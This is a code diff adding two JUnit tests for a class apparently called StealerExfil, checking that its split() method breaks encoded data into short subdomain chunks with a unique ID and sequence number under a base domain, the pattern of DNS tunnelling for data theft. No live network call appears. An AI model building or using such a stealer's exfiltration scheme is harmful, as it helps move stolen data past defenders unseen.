@@ -49,6 +49,44 @@ public class StealerExfilTests {
     }
 
     @Test
+    public void testSplit_FewSubdomains_SeveralRequests() {
+        // Arrange
+        String encodedData = "123456789abcdef";
+        String uniqueId = "something";
+        String baseDomain = "example.com";
+
+        // Act
+        StealerExfil.CONF_MAX_SUBDOMAINS = 2;
+        StealerExfil.CONF_SUBDOMAIN_MAX_LEN = 3;
+        List<String> fqdns = StealerExfil.split(encodedData, uniqueId, baseDomain);
+
+        // Assert
+        assertEquals(3, fqdns.size());
+        assertEquals("abc.def.something-0.example.com", fqdns.get(0));
+        assertEquals("456.789.something-1.example.com", fqdns.get(1));
+        assertEquals("123.something-2.example.com", fqdns.get(2));
+    }
+
+    @Test
+    public void testSplit_OnlyOneSubdomainPerRequest_SeveralRequests() {
+        // Arrange
+        String encodedData = "123456789";
+        String uniqueId = "something";
+        String baseDomain = "example.com";
+
+        // Act
+        StealerExfil.CONF_MAX_SUBDOMAINS = 1;
+        StealerExfil.CONF_SUBDOMAIN_MAX_LEN = 3;
+        List<String> fqdns = StealerExfil.split(encodedData, uniqueId, baseDomain);
+
+        // Assert
+        assertEquals(3, fqdns.size());
+        assertEquals("789.something-0.example.com", fqdns.get(0));
+        assertEquals("456.something-1.example.com", fqdns.get(1));
+        assertEquals("123.something-2.example.com", fqdns.get(2));
+    }
+
+    @Test
     @Ignore // TODO split() does not respect CONF_MAX_FQDN_LEN properly
     public void testSplit_LowMaxFqdn_SeveralRequests() {
         // Arrange
